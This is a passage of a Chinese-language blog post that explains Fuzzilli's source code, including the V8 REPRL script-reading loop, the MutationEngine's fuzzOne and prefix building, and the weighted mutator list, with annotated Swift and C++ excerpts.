class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> V8_FUZZILLI</span><br>  <span class="hljs-keyword">if</span> (fuzzilli_reprl) &#123;<br>    <span class="hljs-function">HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate)</span></span>;<br>    Local&lt;String&gt; file_name =<br>        String::<span class="hljs-built_in">NewFromUtf8</span>(isolate, <span class="hljs-string">&quot;fuzzcode.js&quot;</span>, NewStringType::kNormal)<br>            .<span class="hljs-built_in">ToLocalChecked</span>();<br><br>    <span class="hljs-type">size_t</span> script_size;<span class="hljs-comment">// 读取Reprl发送过来的script_size的地址</span><br>    <span class="hljs-built_in">CHECK_EQ</span>(<span class="hljs-built_in">read</span>(REPRL_CRFD, &amp;script_size, <span class="hljs-number">8</span>), <span class="hljs-number">8</span>);<span class="hljs-comment">// 然后检查script_size地址是否正确读取</span><br>    <span class="hljs-comment">// 在栈上开辟Script脚本大小+1的空间</span><br>    <span class="hljs-type">char</span>* buffer = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[script_size + <span class="hljs-number">1</span>];<br>    <span class="hljs-type">char</span>* ptr = buffer;<br>    <span class="hljs-comment">// 通过数据信道把测试程序读入到buffer中</span><br>    <span class="hljs-type">size_t</span> remaining = script_size;<br>    <span class="hljs-keyword">while</span> (remaining &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// 保证读完</span><br>      <span class="hljs-type">ssize_t</span> rv = <span class="hljs-built_in">read</span>(REPRL_DRFD, ptr, remaining);<br>      <span class="hljs-built_in">CHECK_GE</span>(rv, <span class="hljs-number">0</span>);<br>      remaining -= rv;<br>      ptr += rv;<br>    &#125;<br>    buffer[script_size] = <span class="hljs-number">0</span>;<span class="hljs-comment">// 末尾置0</span><br><br>    Local&lt;String&gt; source =<br>        String::<span class="hljs-built_in">NewFromUtf8</span>(isolate, buffer, NewStringType::kNormal)<br>            .<span class="hljs-built_in">ToLocalChecked</span>();<br>    <span class="hljs-keyword">delete</span>[] buffer;<br>    Shell::<span class="hljs-built_in">set_script_executed</span>();<br>    <span class="hljs-comment">// 执行</span><br>    <span class="hljs-keyword">if</span> (!Shell::<span class="hljs-built_in">ExecuteString</span>(isolate, source, file_name,<br>                              Shell::kReportExceptions)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  <span class="hljs-comment">// V8_FUZZILLI</span></span><br></code></pre></td></tr></table></figure><p>这里会发现子进程通过read 管道句柄来访问jsc脚本数据，而不是直接通过地址来直接访问那块共享内存的，因此父进程写入脚本的效率会大大优于子进程读取脚本的效率。有没有办法能够让子进程拿到父进程mapping的地址？或者父进程mapping到子进程地址空间呢？</p><blockquote><p>可能的解决方案：可以让子进程通过fd来mmap映射一个内存地址，虽然虚拟内存不一样，但是由于fd是一致的，因此实际物理内存是一致的，所以映射出来的东西是一样的。</p></blockquote><p>REPRL其实是一种更加精细化的持久化fuzz: 每次执行测试样例时进程, 线程, Isolate都是同一个, 只会刷新js执行上下文, 以减少执行消耗。</p><p>关于REPRL模式的详细逻辑执行流：</p><p><code>makeFuzzer()</code>初始化Fuzzer对象  $$\rightarrow$$ 初始化<code>runner/engine/codeGenerators/evaluator/lifter/...</code> $$\rightarrow$$ 变异&#x2F;生成<code>FuzzIL</code>代码  $$\rightarrow$$ 使用lifter将FuzzIL代码翻译成javascript代码  $$\rightarrow$$ 若子进程不存在，则父进程创建子进程<code>execve()</code>  $$\rightarrow$$ 将javaScript代码写入shm，并向子进程发送“exec”信号  $$\rightarrow$$ 子进程接收到”exec“信号，通过<code>read()</code>拿到测试用例并执行 $$\rightarrow$$ 子进程继续等待信号，父进程进入Fuzzloop。</p><p>结构清晰后，就需要细看Fuzzilli的mutator，lifter，generator，evaluator等等，才能知道种子是如何生成&#x2F;变异的，以及种子选择策略。到这儿之后，笔者就去重新过一遍Fuzzilli的项目文档了。</p><h3 id="变异引擎：由FuzzEngine初始化开始"><a href="#变异引擎：由FuzzEngine初始化开始" class="headerlink" title="变异引擎：由FuzzEngine初始化开始"></a>变异引擎：由FuzzEngine初始化开始</h3><p>依然来到<code>makeFuzzer()</code>方法，查看engine的初始化做了哪些操作：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">makeFuzzer</span>(<span class="hljs-params">with</span> <span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-type">Fuzzer</span> &#123;<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-comment">// Engines to execute programs.</span><br>    <span class="hljs-keyword">let</span> engine: <span class="hljs-type">FuzzEngine</span><br>    <span class="hljs-keyword">switch</span> engineName &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hybrid&quot;</span>:<br>        engine <span class="hljs-operator">=</span> <span class="hljs-type">HybridEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;multi&quot;</span>:<br>        <span class="hljs-keyword">let</span> mutationEngine <span class="hljs-operator">=</span> <span class="hljs-type">MutationEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>        <span class="hljs-keyword">let</span> hybridEngine <span class="hljs-operator">=</span> <span class="hljs-type">HybridEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>        <span class="hljs-keyword">let</span> engines <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>&lt;<span class="hljs-type">FuzzEngine</span>&gt;([<br>            (mutationEngine, <span class="hljs-number">1</span>),<br>            (hybridEngine, <span class="hljs-number">1</span>),<br>        ])<br>        <span class="hljs-comment">// We explicitly want to start with the MutationEngine since we&#x27;ll probably be finding</span><br>        <span class="hljs-comment">// lots of new samples during early fuzzing. The samples generated by the HybridEngine tend</span><br>        <span class="hljs-comment">// to be much larger than those from the MutationEngine and will therefore take much longer</span><br>        <span class="hljs-comment">// to minimize, making the fuzzer less efficient.</span><br>        <span class="hljs-comment">// For the same reason, we also use a relatively larger iterationsPerEngine value, so that</span><br>        <span class="hljs-comment">// the MutationEngine can already find most &quot;low-hanging fruits&quot; in its first run.</span><br>        engine <span class="hljs-operator">=</span> <span class="hljs-type">MultiEngine</span>(engines: engines, initialActive: mutationEngine, iterationsPerEngine: <span class="hljs-number">10000</span>)<br>        <span class="hljs-keyword">default</span>:<br>        engine <span class="hljs-operator">=</span> <span class="hljs-type">MutationEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>    &#125;<br><br>    <span class="hljs-comment">// Add a post-processor if the profile defines one.</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> postProcessor <span class="hljs-operator">=</span> profile.optionalPostProcessor &#123;<br>        engine.registerPostProcessor(postProcessor)<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>根据参数确定选择的Engine进行对应的初始化操作，三种模式：<code>hybrid</code>、<code>multi</code>和默认的<code>MutationEngine</code>。为了便于理解，先看默认的<code>MutationEngine</code></p><h4 id="MutationEngine"><a href="#MutationEngine" class="headerlink" title="MutationEngine"></a>MutationEngine</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 前文通过参数初始化的变量，连续变异的次数，缺省值为5</span><br><span class="hljs-keyword">let</span> consecutiveMutations <span class="hljs-operator">=</span> args.int(for: <span class="hljs-string">&quot;--consecutiveMutations&quot;</span>) <span class="hljs-operator">??</span> <span class="hljs-number">5</span><br><span class="hljs-operator">....</span><br><br><span class="hljs-keyword">switch</span> engineName &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hybrid&quot;</span>:<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;multi&quot;</span>:<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">default</span>:<br>    engine <span class="hljs-operator">=</span> <span class="hljs-type">MutationEngine</span>(numConsecutiveMutations: consecutiveMutations)<br>&#125;<br></code></pre></td></tr></table></figure><p>紧接着来看<code>MutationEngine()</code>构造函数：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// The core fuzzer responsible for generating and executing programs.</span><br><span class="hljs-comment">// 负责生成和执行程序的核心fuzzer。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MutationEngine</span>: <span class="hljs-title class_ inherited__">FuzzEngine</span> &#123;<br>    <span class="hljs-comment">// The number of consecutive mutations to apply to a sample.</span><br>    <span class="hljs-comment">// 其实质控制变异时生成测试样例的数量，默认为5，则说明一次FuzzOne会变异生成5个样本去执行，每个样本是某个种子应用10次变异算子。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> numConsecutiveMutations: <span class="hljs-type">Int</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">numConsecutiveMutations</span>: <span class="hljs-type">Int</span>) &#123;<br>        <span class="hljs-keyword">self</span>.numConsecutiveMutations <span class="hljs-operator">=</span> numConsecutiveMutations<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(name: <span class="hljs-string">&quot;MutationEngine&quot;</span>)<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这个初始化也就是覆盖一个连续变异次数变量，直接来到关键的<code>FuzzOne()</code>吧，这才是Engine的关键：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MutationEngine</span>: <span class="hljs-title class_ inherited__">FuzzEngine</span> &#123;<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">fuzzOne</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">group</span>: <span class="hljs-type">DispatchGroup</span>) &#123;<br>        <span class="hljs-comment">// 随机选取一个种子作为本次Mutation的parent</span><br>        <span class="hljs-keyword">var</span> parent <span class="hljs-operator">=</span> fuzzer.corpus.randomElementForMutating()<br>        <span class="hljs-comment">// 将这个种子进行一个预处理以便能够变异</span><br>        parent <span class="hljs-operator">=</span> prepareForMutating(parent)<br>        <span class="hljs-comment">// numConsecutiveMutations之前说过，控制本轮FuzzOne()产生的样本数量</span><br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>numConsecutiveMutations &#123;<br>            <span class="hljs-comment">// 根据权重在所有Mutator中选取一个</span><br>            <span class="hljs-keyword">var</span> mutator <span class="hljs-operator">=</span> fuzzer.mutators.randomElement()<br>            <span class="hljs-comment">// 在该样本上执行变异的次数：10次</span><br>            <span class="hljs-keyword">let</span> maxAttempts <span class="hljs-operator">=</span> <span class="hljs-number">10</span><br>            <span class="hljs-keyword">var</span> mutatedProgram: <span class="hljs-type">Program</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>            <span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>maxAttempts &#123;<br>                <span class="hljs-comment">// 调用mutate方法对种子进行变异</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> mutator.mutate(parent, for: fuzzer) &#123;<br>                    <span class="hljs-comment">// Success!</span><br>                    result.contributors.formUnion(parent.contributors)<br>                    mutator.addedInstructions(result.size <span class="hljs-operator">-</span> parent.size)<br>                    mutatedProgram <span class="hljs-operator">=</span> result<br>                    <span class="hljs-keyword">break</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// Try a different mutator.</span><br>                    mutator.failedToGenerate()<br>                    mutator <span class="hljs-operator">=</span> fuzzer.mutators.randomElement()<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> program <span class="hljs-operator">=</span> mutatedProgram <span class="hljs-keyword">else</span> &#123;<br>                logger.warning(<span class="hljs-string">&quot;Could not mutate sample, giving up. Sample:<span class="hljs-subst">\n</span><span class="hljs-subst">\(FuzzILLifter().lift(parent))</span>&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br>            &#125;<br><br>            <span class="hljs-built_in">assert</span>(program <span class="hljs-operator">!==</span> parent)<br>            <span class="hljs-keyword">let</span> outcome <span class="hljs-operator">=</span> execute(program)<br><br>            <span class="hljs-comment">// Mutate the program further if it succeeded.</span><br>            <span class="hljs-keyword">if</span> .succeeded <span class="hljs-operator">==</span> outcome &#123;<br>                parent <span class="hljs-operator">=</span> program<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>大多是调用Mutator的api来完成变异操作，没有种子选择策略，是随机在corpus中随机选择一个种子。MutationEngine类的重点其实是<code>prepareForMutating()</code>方法，进一步看看这个方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MutationEngine</span>: <span class="hljs-title class_ inherited__">FuzzEngine</span> &#123;<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-comment">/// Pre-processing of programs to facilitate mutations on them.</span><br>    <span class="hljs-comment">// 对程序进行预处理，使其易于进行变异。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">prepareForMutating</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">program</span>: <span class="hljs-type">Program</span>) -&gt; <span class="hljs-type">Program</span> &#123;<br>        <span class="hljs-comment">// 初始化一个ProgramBuilder对象</span><br>        <span class="hljs-keyword">let</span> b <span class="hljs-operator">=</span> fuzzer.makeBuilder()<br>        <span class="hljs-comment">// 生成一些前缀代码</span><br>        b.buildPrefix()<br>        <span class="hljs-comment">// 前缀代码+program组成新的program</span><br>        b.append(program)<br>        <span class="hljs-comment">// finalize()会将新的program返回，并重置对象b的状态</span><br>        <span class="hljs-keyword">return</span> b.finalize()<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这些API就不进一步分析了，因为ProgramBuilder是Base类，等到二次开发再细究这些接口功能就行了。不用关心具体实现。简单看看这个和Program相关的Prefix：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MutationEngine</span>: <span class="hljs-title class_ inherited__">FuzzEngine</span> &#123;<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">buildPrefix</span>() &#123;<br>        <span class="hljs-comment">// 每个值生成器应该至少生成3个变量，并且我们可能希望至少运行其中的几个变量（可能大约为&gt;= 3），</span><br>        <span class="hljs-comment">// 因此要构建的变量数量不应该设置得太低。</span><br>        <span class="hljs-built_in">assert</span>(<span class="hljs-type">CodeGenerator</span>.numberOfValuesToGenerateByValueGenerators <span class="hljs-operator">==</span> <span class="hljs-number">3</span>)<br>        <span class="hljs-comment">// 产生一个10 ~ 15的随机数</span><br>        <span class="hljs-keyword">let</span> numValuesToBuild <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>.random(in: <span class="hljs-number">10</span><span class="hljs-operator">...</span><span class="hljs-number">15</span>)<br><br>        trace(<span class="hljs-string">&quot;Start of prefix code&quot;</span>)<br>        <span class="hljs-comment">// 运行ValueGenerators,直到创建numValuesToBuild个新变量</span><br>        buildValues(numValuesToBuild)<br>        <span class="hljs-comment">// 可见变量的数量要确定大于等于刚创建的可见变量</span><br>        <span class="hljs-built_in">assert</span>(numberOfVisibleVariables <span class="hljs-operator">&gt;=</span> numValuesToBuild)<br>        trace(<span class="hljs-string">&quot;End of prefix code. <span class="hljs-subst">\(numberOfVisibleVariables)</span> variables are now visible&quot;</span>)<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="变异器：由Mutator初始化开始"><a href="#变异器：由Mutator初始化开始" class="headerlink" title="变异器：由Mutator初始化开始"></a>变异器：由Mutator初始化开始</h3><p>依然还是<code>makeFuzzer()</code>方法，看看变异器对象的初始化：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">makeFuzzer</span>(<span class="hljs-params">with</span> <span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-type">Fuzzer</span> &#123;<br>    <span class="hljs-keyword">let</span> disabledMutators <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>(profile.disabledMutators)<span class="hljs-comment">// 通过命令行参数profile来确定是否有被禁用的变异器</span><br>    <span class="hljs-comment">// 初始化各个变异器的对象，并为它们分配一个权重</span><br>    <span class="hljs-keyword">var</span> mutators <span class="hljs-operator">=</span> <span class="hljs-type">WeightedList</span>([<br>        (<span class="hljs-type">ExplorationMutator</span>(),                 <span class="hljs-number">3</span>),<br>        (<span class="hljs-type">CodeGenMutator</span>(),                     <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">SpliceMutator</span>(),                      <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">ProbingMutator</span>(),                     <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">InputMutator</span>(typeAwareness: .loose),  <span class="hljs-number">2</span>),<br>        (<span class="hljs-type">InputMutator</span>(typeAwareness: .aware),  <span class="hljs-number">1</span>),<br>        <span class="hljs-comment">// 还在实验性阶段的Mutator: ConcatMutator是一个限制版的CombineMutator()</span><br>        <span class="hljs-comment">// (ConcatMutator(),                   1),</span><br>        (<span class="hljs-type">OperationMutator</span>(),                   <span class="hljs-number">1</span>),<br>        (<span class="hljs-type">CombineMutator</span>(),                     <span class="hljs-number">1</span>),<br>        <span class="hljs-comment">// 如果删除了必要的try-catch，那么就启用FixupMutator</span><br>        <span class="hljs-comment">// (FixupMutator()),                   1),</span><br>    ])<br>    <span class="hljs-comment">// 获取一个所有变异器名称的集合，方便后续过滤禁用的变异器</span><br>    <span class="hljs-keyword">let</span> mutatorsSet <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>(mutators.map &#123; <span class="hljs-variable">$0</span>.name &#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>disabledMutators.isSubset(of: mutatorsSet) &#123;<span class="hljs-comment">// 如果不是所有变异器集合的子集，那么报错</span><br>        <span class="hljs-operator">...</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>disabledMutators.isEmpty &#123;<span class="hljs-comment">// 如果禁用变异器列表不为空，那么mutators禁用这些变异器</span><br>        mutators <span class="hljs-operator">=</span> mutators.filter(&#123; <span class="hljs-operator">!</span>disabledMutators.contains(<span class="hljs-variable">$0</span>.name) &#125;)<br>    &#125;<br>    <span class="hljs-keyword">if</span> mutators.isEmpty &#123;<span class="hljs-comment">// 如果所有的变异器都被禁用，报错</span><br>        <span class="hljs-operator">...</span><br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>先看看这里这么多变异器的构造函数做了什么，<code>ExplorationMutator()</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExplorationMutator</span>: <span class="hljs-title class_ inherited__">RuntimeAssistedMutator</span> &#123;<br>    <span class="hljs-comment">// 如果为true,则此mutator将记录详细的统计信息，例如执行每种类型操作的频率。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> verbose <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment">// 在探索期间执行每个操作的频率，仅在verbose模式下使用。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> actionUsageCounts <span class="hljs-operator">=</span> [<span class="hljs-type">ActionOperation</span>: <span class="hljs-type">Int</span>]()<br><br>    <span class="hljs-comment">// 出于统计目的，跟踪插入的explore操作的平均数量。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> averageNumberOfInsertedExploreOps <span class="hljs-operator">=</span> <span class="hljs-type">MovingAverage</span>(n: <span class="hljs-number">1000</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>() &#123;<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(<span class="hljs-string">&quot;ExplorationMutator&quot;</span>, verbose: <span class="hljs-type">ExplorationMutator</span>.verbose)<br>        <span class="hljs-keyword">if</span> verbose &#123;<br>            <span class="hljs-keyword">for</span> op <span class="hljs-keyword">in</span> <span class="hljs-type">ActionOperation</span>.allCases &#123;<br>                actionUsageCounts[op] <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是<code>CodeGenMutator()</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// A mutator that generates new code at random positions in a program.</span><br><span class="hljs-comment">// 在程序中的随机位置生成新代码的mutator</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeGenMutator</span>: <span class="hljs-title class_ inherited__">BaseInstructionMutator</span> &#123;<br>    <span class="hljs-comment">// DeadCodeAnalyzer是确定当前指令之后的代码是否为死代码（永远不会执行的部分，如return后面的代码）。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> deadCodeAnalyzer <span class="hljs-operator">=</span> <span class="hljs-type">DeadCodeAnalyzer</span>()<br>    <span class="hljs-comment">// VariableAnalyzer是在程序构造期间跟踪当前可见的变量（确保生成的代码能正确引用已有变量）。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> variableAnalyzer <span class="hljs-operator">=</span> <span class="hljs-type">VariableAnalyzer</span>()<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> minVisibleVariables <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">// 最小可见变量数量为3，即最少3个可见变量才开始生成新代码</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>() &#123;<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(maxSimultaneousMutations: defaultMaxSimultaneousCodeGenerations)<br>        <span class="hljs-comment">// ProgramBuilder.minBudgetForRecursiveCodeGeneration指能够调用递归代码生成器所需的最小预算</span><br>        <span class="hljs-comment">// defaultCodeGenerationAmount是每次生成代码时的默认预算</span><br>        <span class="hljs-built_in">assert</span>(defaultCodeGenerationAmount <span class="hljs-operator">&gt;=</span> <span class="hljs-type">ProgramBuilder</span>.minBudgetForRecursiveCodeGeneration)<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 在MutatorSettings.swift中一些全局变量定义如下</span><br><span class="hljs-comment">// 单次测试用例变异时，最多同时应用7种不同的基础变异（变异算子）操作</span><br><span class="hljs-keyword">let</span> defaultMaxSimultaneousMutations <span class="hljs-operator">=</span> <span class="hljs-number">7</span><br><span class="hljs-comment">// 单次测试用例变异时，最多插入3次全新生成的代码块，也就是最多执行3次CodeGenMutator</span><br><span class="hljs-keyword">let</span> defaultMaxSimultaneousCodeGenerations <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br><span class="hljs-comment">// 每次调用CodeGenMutator时，生成指令的数量</span><br><span class="hljs-keyword">let</span> defaultCodeGenerationAmount <span class="hljs-operator">=</span> <span class="hljs-number">5</span>      <span class="hljs-comment">// This must be at least ProgramBuilder.minBudgetForRecursiveCodeGeneration</span><br></code></pre></td></tr></table></figure><blockquote><p>需要确定的是，因为CodeGenMutator会有生成递归结构的可能性，一个递归结构需要生成至少五条FuzzIL指令，因此生成器每次生成的指令数需要大于递归结构最小的指令数。</p></blockquote><p>紧接着是<code>SpliceMutator()</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span 